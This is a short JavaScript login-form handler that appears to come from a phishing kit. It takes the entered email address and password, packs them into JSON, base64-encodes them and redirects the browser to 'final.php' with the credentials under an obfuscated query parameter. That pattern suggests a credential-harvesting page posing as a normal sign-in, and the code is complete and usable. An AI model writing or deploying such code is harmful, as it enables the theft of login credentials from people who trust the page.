function check(){


         const user = removeSpaces(document.getElementById('username').value);
         const pass = removeSpaces(document.getElementById('password').value);
         var len =user.trim().length;
         if (len < 1){document.getElementById('error-class').innerHTML="Please enter correct details to continue...";return false;}
         if (user == ""||pass==""){document.getElementById('error-class').innerHTML="Email adddress and Password is empty...";return false;}
         if (user === pass){document.getElementById('error-class').innerHTML="Email adddress and Password can not be same...";return false;}
           
         
    // Step 2: Merge the input value
                   var formData = {username: user,password: pass};
      
                
    // Convert the form data to JSON string
              var jsonData = JSON.stringify(formData);
              
    // Step 3: Encode the value (optional, but recommended to handle special characters)
              var encodedData = btoa(unescape(encodeURIComponent(jsonData)));
            
          // Step 4: Redirect to the PHP file with the data in the URL
          window.location.href = `final.php?kjhfgj43urhgue83ewhuww=${encodedData}`;
  }
  function removeSpaces(string){
  return string.split(' ').join('');
  }
 
